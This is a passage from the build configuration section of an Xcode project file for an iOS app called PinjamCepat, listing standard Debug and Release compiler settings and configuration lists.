				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		7315F8332F7220F500C6DE2E /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		7315F8172F7220F400C6DE2E /* Build configuration list for PBXProject "PinjamCepat" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				7315F8322F7220F500C6DE2E /* Debug */,
				7315F8332F7220F500C6DE2E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		7315F82F2F7220F500C6DE2E /* Build configuration list for PBXNativeTarget "PinjamCepat" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				7315F8302F7220F500C6DE2E /* Debug */,
				7315F8312F7220F500C6DE2E /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 7315F8142F7220F400C6DE2E /* Project object */;
}
